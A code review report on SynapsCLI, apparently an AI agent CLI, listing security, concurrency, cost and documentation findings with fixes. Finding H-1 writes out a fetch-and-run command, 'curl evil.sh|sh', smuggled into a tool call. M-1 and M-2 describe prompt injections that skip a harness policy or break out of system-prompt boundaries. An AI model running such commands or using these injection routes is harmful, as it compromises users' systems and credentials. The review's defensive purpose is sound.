# SynapsCLI Full Code Review — 9cc8b33..dev

**Date:** 2026-05-03
**Scope:** 130 commits, 21,217 lines added, 741 removed, 125 files
**Reviewers:** Zero (Architecture), Shady (Code Quality), Silverhand (Security), Chrollo (API Design), Case (Failure Modes), Gojo (Concurrency), Yoru (Performance), Spike (Backwards Compat), Starlord (Docs/DX), Joestar (Testing), Okarin (State/Data Integrity), Dexter (Cost/Efficiency)
**Session:** S184

---

## Critical Findings — Fix Immediately

### C-1. Extensions inherit full parent environment (CRITICAL)
- **Found by:** Silverhand
- **File:** `src/extensions/runtime/process.rs:585-603`
- **CWE:** CWE-526, CWE-200
- Extension processes spawned with no `env_clear()`. Every plugin inherits `ANTHROPIC_API_KEY`, `SSH_AUTH_SOCK`, `AWS_*`, other extensions' `secret_env` values. A weather plugin can silently exfiltrate the entire credential surface.
- **Fix:** `cmd.env_clear()` then explicitly forward only `PATH`, `HOME`, `LANG`, and declared `secret_env` names from manifest.

### C-2. Zero process isolation for extensions (CRITICAL)
- **Found by:** Silverhand
- **File:** `src/extensions/runtime/process.rs:592-603`
- **CWE:** CWE-250
- No `setsid`, no namespace, no `seccomp`, no `rlimit`, no `kill_on_drop(true)`, no cgroup. Extension is a full peer of synaps — filesystem, network, can ptrace.
- **Fix (immediate):** `kill_on_drop(true)`, document trust model. **Fix (roadmap):** bubblewrap/landlock/seccomp, `runtime: wasm` lane.

### C-3. JSONL append non-atomic — silent data loss (CRITICAL)
- **Found by:** Gojo, Silverhand, Case, Okarin
- **Files:** `src/memory/store.rs:131-135`, `src/core/session_index.rs:80-89`
- Two `write_all` calls (body + newline) instead of one. Concurrent appenders interleave records. Memory store silently skips corrupted lines. Session index crashes on first bad line.
- **Audit log at `extensions/audit.rs:97-108` does it correctly** — single write with `\n` appended to string first.
- **Fix:** `let mut line = serde_json::to_string(record)?; line.push('\n'); f.write_all(line.as_bytes())?;` — same pattern as audit.rs.

### C-4. Static singleton EXTENSION_MANAGER (CRITICAL — architectural)
- **Found by:** Zero, Gojo
- **File:** `src/runtime/openai/mod.rs:30`
- `static EXTENSION_MANAGER: std::sync::RwLock<Option<Arc<tokio::sync::RwLock<ExtensionManager>>>>` — process-global mutable state with two stacked locks.
- Tests can't run parallel (`--test-threads=1`). Multi-runtime impossible. Subagents inherit implicitly. `cmd/agent.rs` and `cmd/chat.rs` may not call `set_extension_manager_for_routing` — latent bug.
- **Fix:** Pass `ProviderRouteContext` through `Runtime` struct. Delete the static and its 4 accessor functions.

---

## High Priority — Fix Before Release

### H-1. `Modify` hook silently rewrites tool input (HIGH — security)
- **Found by:** Silverhand
- **Files:** `src/extensions/hooks/mod.rs:230-237`, `src/runtime/mod.rs:92-110`
- Extension can rewrite `cat README.md` to `cat README.md; curl evil.sh|sh`. User sees original in TUI. Only `info`-level log.
- **Fix:** Force `Confirm` round-trip showing diff, OR persist audit entry + UI marker per `Modify`.

### H-2. Trust state loads fail-open (HIGH — security)
- **Found by:** Silverhand, Okarin
- **Files:** `src/runtime/openai/mod.rs:129`, `src/extensions/manager.rs:545`
- Corrupt/unreadable `trust.json` → `unwrap_or_default()` → all providers enabled.
- **Fix:** Distinguish "missing" (legitimate default) from "corrupt" (fail closed, refuse routing, show banner).

### H-3. ANSI/control-char injection in tool/provider metadata (HIGH)
- **Found by:** Silverhand
- **File:** `src/extensions/validation.rs:39-57`
- `validate_id_segment` doesn't reject `\x1B` (ESC), `\x07` (BEL), C0 controls. Tool descriptions have NO validation. Rendered raw by ratatui.
- **Fix:** Add `c.is_control()` to `validate_id_segment`. Add `validate_display_string()` for all rendered text.

### H-4. Providers enabled-by-default, no TOFU prompt (HIGH — security)
- **Found by:** Silverhand
- **File:** `src/extensions/trust.rs:12-19`
- First marketplace plugin registration routes immediately. No "trust this provider?" prompt.
- **Fix:** TOFU — mark new `runtime_id` as `disabled: true` on first appearance, prompt user.

### H-5. `disabled_plugins` doesn't disable plugin commands/keybinds/help (HIGH)
- **Found by:** Silverhand, Chrollo, Zero (previous 4-agent review)
- **File:** `src/skills/mod.rs:70-99`
- `filter_disabled()` only filters skills. Plugin manifest commands, keybinds, help_entries pass through raw.
- **Fix:** Filter plugins by `disabled_plugins` before passing to `CommandRegistry`.

### H-6. Pending-request leak race — call hangs forever (HIGH)
- **Found by:** Gojo
- **File:** `src/extensions/runtime/process.rs:1281-1326`
- Race between reader exiting on EOF and caller registering in `inbox.pending`. Caller awaits `rx` indefinitely — no timeout, no cleanup.
- **Fix:** Add `closed: AtomicBool` to `Inbox` with double-check pattern. Wrap `rx.await` in `tokio::time::timeout`.

### H-7. Compaction handoff has 3 uncovered crash windows (HIGH — data integrity)
- **Found by:** Okarin
- **File:** `src/chatui/mod.rs:340-405`
- Crash between new session save and old session link = forked timeline. Crash before chain advance = orphaned chains. Crash after drain but before save = lost queued message.
- **Fix:** Add `save_session()` after step 7. Reorder chain advance ahead of drain.

### H-8. Extension restart counter never resets (HIGH)
- **Found by:** Okarin, Case
- **File:** `src/extensions/runtime/process.rs:1208-1217`
- `restart_count` incremented on every attempt, never reset on success. 3 cumulative failures across hours = permanent disable.
- **Fix:** Reset counter on successful `initialize_locked`. Or use sliding window (3 in 60s).

### H-9. `tool.call` and `initialize` have no timeout (HIGH)
- **Found by:** Case
- **File:** `src/extensions/runtime/process.rs:1455, 1258`
- `provider_complete` (60s), `hook.handle` (5s) have timeouts. `tool.call` and `initialize` don't. Hung plugin blocks caller indefinitely. Sequential discovery means one hung plugin blocks all subsequent loads.
- **Fix:** Wrap in `tokio::time::timeout` (30s default for tools, 10s for initialize).

### H-10. Default model is Opus, subagents inherit it (HIGH — cost)
- **Found by:** Dexter
- **File:** `src/core/models.rs:11`, `src/tools/subagent/oneshot.rs:83`
- Every `subagent` call without explicit `model:` runs on claude-opus-4-7 ($15/$75 per 1M). 5-10× cost overrun.
- **Fix:** Default runtime to Sonnet. Subagents default to Haiku for one-shot tasks.

### H-11. `before_message` inject busts system-prompt cache (HIGH — cost)
- **Found by:** Dexter
- **File:** `src/runtime/stream.rs:139-147`
- Injected content prepended to system prompt. If it varies per turn (timestamps, memory recall), 100% cache miss every turn.
- **Fix:** Put injection in separate leading block, OR require extensions to declare stable vs dynamic.

### H-12. God-objects in chatui (HIGH — architectural debt)
- **Found by:** Zero, Shady
- **Files:** `src/chatui/mod.rs` (1,530 LOC), `src/chatui/app.rs` (1,317 LOC, 52 fields)
- Single `fn run()` with 47 `CommandAction` variants inlined. Every new feature requires 3 edits.
- **Fix:** Extract `chatui/effects/` module. Decompose App into 8 sub-states + `Modal` enum.

### H-13. `process.rs` is 1,909-line monolith (HIGH — architectural debt)
- **Found by:** Zero, Shady
- **File:** `src/extensions/runtime/process.rs`
- Mixes: transport, protocol types, inbound RPC dispatch, provider tool-loop, voice validation, lifecycle.
- **Fix:** Split into `wire.rs`, `schema.rs`, `inbox.rs`, `reader.rs`, `inbound/dispatcher.rs`, `inbound/memory.rs`, `provider_loop.rs`.

---

## Medium Priority

### M-1. Codex autonomous policy prompt-injectable (MED — security)
- **Found by:** Silverhand, Case
- **File:** `src/runtime/openai/stream.rs:272-281`
- Sentinel string `[Synaps autonomous harness policy]` in any system prompt skips the real policy.
- **Fix:** Use structured bool, not string match. Gate with `SYNAPS_CODEX_AUTONOMOUS=0` config.

### M-2. Inject prepended to system prompt — injection vector (MED — security)
- **Found by:** Silverhand, Chrollo
- **File:** `src/runtime/stream.rs:140-147`
- Extension can embed `[End extension context]` tag to break out of boundary. Nested-tag injection.
- **Fix:** Sanitize — reject content containing boundary markers. Or use non-ASCII delimiter.

### M-3. Session index crashes on first corrupt line (MED — reliability)
- **Found by:** Case, Okarin, Joestar, Gojo
- **File:** `src/core/session_index.rs:104-107`
- Memory store skips bad lines. Session index `?` errors on first one. Inconsistent.
- **Fix:** Skip-and-warn like memory store.

### M-4. OpenAI providers report 0 cache tokens always (MED — cost)
- **Found by:** Dexter
- **File:** `src/runtime/openai/translate.rs:294-301`
- `prompt_tokens_details.cached_tokens` from OpenAI discarded. Can't measure cache efficiency.
- **Fix:** Parse and propagate. ~30 lines.

### M-5. Config resolution order doc/code drift (MED — DX)
- **Found by:** Chrollo
- Docs: env → config_key → secret_env → default. Code: env → secret_env → config_key → default.
- **Fix:** Reconcile. One of them is wrong.

### M-6. `memory.read/write` + `audio.*` permissions missing from contract.json (MED — DX)
- **Found by:** Chrollo
- Code accepts them, docs don't list them. Auto-generated tooling will reject valid manifests.

### M-7. Concurrent atomic-write trampling — fixed-name temp files (MED — concurrency)
- **Found by:** Gojo
- **Files:** `src/extensions/trust.rs:76-88`, `src/skills/state.rs:111-114`
- Two concurrent savers use same `trust.json.tmp` filename. Content trampling + spurious ENOENT.
- **Fix:** `tempfile::NamedTempFile::persist`.

### M-8. `Result<_, String>` everywhere — 147 sites (MED — code quality)
- **Found by:** Shady
- `MemoryError` shows the team knows how. Everything else returns `String`.
- **Fix:** `thiserror`. Define `ExtensionError`, `RuntimeError`, `PluginError`.

### M-9. 4 failing tests on cargo test --lib (MED — CI)
- **Found by:** Shady
- `chain::save_load_delete_list`, `config::favorite_model_helpers`, `config::write_config_value`, `events::registry::socket_path_format`
- Shared env state between parallel tests.
- **Fix:** `serial_test` crate or thread config object.

### M-10. No spend / token circuit-breaker (MED — cost)
- **Found by:** Dexter
- No per-session token cap, no per-hour cap. Misbehaving subagent loop on Opus can burn $50.
- **Fix:** Cumulative counter + configurable hard cap + soft warning at 80%.

### M-11. Marketplace integrity is TOFU + optional sha256 (MED — security)
- **Found by:** Silverhand
- Checksum is optional and lives in same JSON as the payload. No detached signing.
- **Fix (incremental):** Mandatory checksum for v2. Add ed25519 signature field. Show "unsigned" badge.

### M-12. No per-extension memory quota (MED — DoS)
- **Found by:** Silverhand
- 16KB per record but no cap on records-per-namespace. Plugin fills disk in minutes.
- **Fix:** Per-namespace size cap + write-rate token bucket.

### M-13. Auth corrupt-backups accumulate forever (MED)
- **Found by:** Silverhand
- Every parse failure creates `.json.corrupt.<ts>` copy, never garbage-collected.
- **Fix:** Delete backups older than N days.

### M-14. No fsync on atomic writes (MED — data integrity)
- **Found by:** Okarin
- **Files:** `trust.rs`, `state.rs`, `watcher_exit.rs`
- write + rename without `sync_all()`. Power loss between rename and flush = zero-length file.
- **Fix:** Add `sync_all()` + parent dir fsync.

### M-15. Injection content sanitization regression (MED — security)
- **Found by:** Chrollo
- Old code stripped boundary markers from injected text. New code passes verbatim.
- **Fix:** Reinstate strip or use nonce-based delimiter.

---

## Performance Risks — Top 10

### P-1. `call_lock` serializes all RPCs per extension (RED)
- **Found by:** Yoru
- **File:** `process.rs:1349-1383`
- One slow `provider.complete` (60s) blocks every `hook.handle` (5s) to same extension.
- **Fix:** Drop `call_lock`; stdin mutex already serializes writes. Enable pipelining.
- **Impact:** 5-50× concurrent throughput per extension.

### P-2. `HookBus::emit` clones handler list + event + reads env var per handler (RED)
- **Found by:** Yoru
- **File:** `hooks/mod.rs:117-196`
- Full `Vec<Registration>` clone. `event.clone()` per handler (kilobytes of JSON). `std::env::var` syscall per iteration.
- **Fix:** `arc_swap::ArcSwap` for handlers. `Arc<HookEvent>` instead of clone. Cache trace_enabled in `OnceLock`.
- **Impact:** ~3× allocation reduction on every hook dispatch.

### P-3. Tool registry deep-cloned every LLM round (RED)
- **Found by:** Yoru
- **File:** `runtime/stream.rs:116`
- `tools.read().await.clone()` — HashMap + schema + name maps. ~50 allocations per turn.
- **Fix:** `ArcSwap<ToolRegistry>`. Readers do atomic load. Register swaps in new instance.
- **Impact:** ~50 allocs/iter eliminated.

### P-4. Memory store query is O(N) full file scan, sync I/O (RED)
- **Found by:** Yoru
- **File:** `memory/store.rs:137-193`
- Sync `fs::File::open` on async path. `to_lowercase()` allocates per record. No index. Unbounded growth.
- **Fix:** `spawn_blocking`. Reverse reader. Per-namespace rotation.
- **Impact:** O(history) → O(limit).

### P-5. Provider tool-loop clones full params per iteration (RED)
- **Found by:** Yoru
- **File:** `process.rs:299-317`
- `params.clone()` contains entire conversation + tool schema. 8 iterations = quadratic.
- **Fix:** Pass `&ProviderCompleteParams`. Split immutable (Arc'd) from mutable (messages owned).
- **Impact:** O(n) → O(1) cloning per call.

### P-6. HelpRegistry rebuilt per keystroke (ORANGE)
- **Found by:** Yoru, Chrollo, Zero
- **Files:** `input.rs:511`, `commands.rs:382`, `mod.rs:526`
- `builtin_entries()` re-parses 520-line JSON every call. Three callsites.
- **Fix:** `OnceLock<Arc<Vec<HelpEntry>>>`. Cache merged registry on App.

### P-7. Help fuzzy search re-lowercases every field per keystroke (ORANGE)
- **Found by:** Yoru, Shady
- `filtered_rows()` called 5-7× per keystroke. O(n² log n) category sort.
- **Fix:** Pre-compute normalized fields. Memoize filtered_rows.

### P-8. Extension tool registration is O(n²) — rebuild_schema per register (ORANGE)
- **Found by:** Yoru
- **File:** `manager.rs:238-241`
- Loop calls `register()` individually. Each rebuilds schema. Already fixed for built-ins but reintroduced for extensions.
- **Fix:** `register_many()` — insert all, rebuild once.

### P-9. Plugin discovery loads serially (ORANGE)
- **Found by:** Yoru
- **File:** `manager.rs:660-770`
- N plugins × handshake_latency. 5 plugins @ 200ms = 1s cold start.
- **Fix:** `tokio::task::JoinSet` — parallel spawn+init, sequential register.

### P-10. Session index reads entire file for limit=10 (ORANGE)
- **Found by:** Yoru, Okarin
- **File:** `session_index.rs:92-111`
- `read_to_string` then `.lines().rev().take(limit)`. MBs after a year.
- **Fix:** Reverse-line reader. O(limit) instead of O(history).

---

## Testing Gaps

### T-1. `chatui/plugins/actions.rs` — 1,006 LOC, ZERO tests (CRITICAL)
- Every plugin lifecycle write path untested.

### T-2. `try_route` trust-blocked path — security-critical, 1 happy-path test (HIGH)
- No test for: disabled provider, cancellation, non-streaming+tools, audit emission.

### T-3. `validate_registered_provider_specs` — zero direct unit tests (HIGH)
- Only tested end-to-end via Python fixtures.

### T-4. `resolve_config` precedence — zero tests (HIGH)
- Five-level priority chain completely unverified.

### T-5. 4 failing tests on `cargo test --lib` (MED)
- Shared env state. Need `serial_test` or threaded config.

### T-6. Sleep-based assertions in e2e tests — flake risk (MED)
- `extensions_e2e.rs:330`, `shell_pty.rs` — 4 sites with `tokio::time::sleep`.

### T-7. `chatui/help_find.rs` rendering — 280 LOC, 0 tests (MED)
- Text wrapping untested for CJK/long-URL/empty-results.

### T-8. `session_index` malformed-line behavior — no test either way (MED)
- Inconsistent with memory store. No test codifying the choice.

---

## Docs & DX Gaps

### D-1. README, AGENTS.md, CHANGELOG — untouched for 130 commits (CRITICAL)
- 21K lines of features, zero top-level doc updates.

### D-2. `cargo install synaps-cli` in README — crate doesn't exist (HIGH)
- First command a new user tries = 404.

### D-3. Extensions README lists 5 hooks, code has 7 (HIGH)
- Missing `on_message_complete`, `on_compaction`.

### D-4. Example extensions have no manifests (HIGH)
- Can't be dropped into plugins dir as docs describe.

### D-5. 7 slash commands missing from `/help` (MED)
- `/system`, `/thinking`, `/resume`, `/saveas`, `/theme`, `/keybinds`, `/extensions memory`.

### D-6. Extension config only documented in protocol.md (MED)
- User-facing README doesn't mention `extension.config`, `secret_env`, resolution order.

### D-7. No "Hello World" extension guide (MED)
- Protocol.md is reference-grade. Missing the 60-second quickstart layer.

---

## Backwards Compatibility

### B-1. `initialize` RPC now mandatory (BREAKING)
- Extensions without it fail with `FailedInitialize`. Must add handler returning `{protocol_version: 1, capabilities: {}}`.

### B-2. `LlmEvent::ToolUseStart/Delta` tuple → struct variants (BREAKING for embedders)
- Any external crate matching on these breaks at compile time.

### B-3. `HookEvent` schema changed (BREAKING for strict deserializers)
- `timestamp` and `metadata` fields removed, replaced by `data`.

### B-4. Manifest validation tightened (BEHAVIORAL)
- Zero-hook-zero-permission manifests rejected. Unknown permissions rejected. Tool-filter on non-tool hooks rejected.

### B-5. Extensions spawn with plugin root as cwd (BEHAVIORAL)
- Previously process-default. Extensions hardcoding cwd may regress.

---

## Cost & Efficiency

### $-1. Default model → Opus ($15/$75 per 1M) — subagents inherit
- **Fix:** Default to Sonnet. Subagents to Haiku. **Savings: 5-10×**.

### $-2. `before_message` inject busts cache every turn
- **Fix:** Separate block or stable-injection declaration. **Savings: ~30-50% on cached prefix**.

### $-3. OpenAI providers report 0 cache tokens
- **Fix:** Parse `prompt_tokens_details.cached_tokens`. **Unlocks: observability**.

### $-4. Codex runs with `store: false` — full retransmission every turn
- **Fix:** Flip to `store: true`, pass `previous_response_id`. **Savings: ~50% prefix on 10-turn sessions**.

### $-5. Compaction has zero prompt caching
- **Fix:** Add `cache_control: ephemeral` to last system block. **Savings: ~30% on 2nd+ compaction**.

### $-6. No spend circuit-breaker
- **Fix:** Cumulative token counter + configurable hard cap.

### $-7. Thinking budget doesn't decay across tool-loop turns
- **Fix:** Downshift to `effort=low` after first non-trivial response.

### $-8. Subagent spawns fresh Tokio runtime per call
- **Fix:** Share parent's auth state + HTTP client. Pool runtimes.

---

## What's Solid — Praise From All 12

- **OAuth flow** — PKCE S256, state validation, localhost-only bind, flock, 0o600. Clean.
- **`tool_id` plumb-through** — most important engineering win. Fixes parallel tool call misrouting end-to-end.
- **Permission model** — hook ↔ permission gating at subscribe time. Defense in depth.
- **Memory namespace isolation** — extensions can only read/write their own namespace.
- **Hook bus design** — type/tool-filter/matcher/permissions tuple. Capability snapshots for status.
- **`help.rs` module extraction** — pure data + render, no I/O, tested in isolation.
- **`viewport.rs`** — self-contained, well-documented, pure functions.
- **`session_index.rs`** — small, focused, leaf-only deps.
- **`Inbox` survival across restarts** — thoughtful state-lifetime design.
- **Test fixtures** — 22 Python extension fixtures + 13 test files. Real protocol coverage.
- **Audit log implementation** — single write_all, never logs content, privacy intact.
- **`contracts_sync.rs`** — code can't drift from contract.json.

---

## Recommended Fix Order

### This week (< 500 LOC total):
1. `cmd.env_clear()` on extension spawn — 1 line, closes credential theft
2. Single-write JSONL for memory + session_index — 10 lines each
3. Default model → Sonnet — 1 line, 5× savings on subagents
4. Trust fails-closed on corrupt file — 5 lines
5. `tool.call` + `initialize` timeouts — 10 lines each
6. Fix the 4 failing tests — serial_test or threaded config
7. `disabled_plugins` filter for plugin manifests — 5 lines
8. Reset restart counter on success — 3 lines

### Next sprint:
9. Control-char validation on all rendered strings
10. TOFU prompt for new providers
11. Pending-request leak race fix (closed flag + timeout)
12. Parse OAI cache tokens
13. Add `save_session()` after compaction drain
14. Compaction cache_control
15. Token circuit-breaker

### Refactoring (ongoing):
16. Extract `chatui/effects/` from mod.rs
17. Decompose App into sub-states
18. Split process.rs into modules
19. `thiserror` pass on extensions
20. Cache HelpRegistry
21. Eliminate EXTENSION_MANAGER singleton
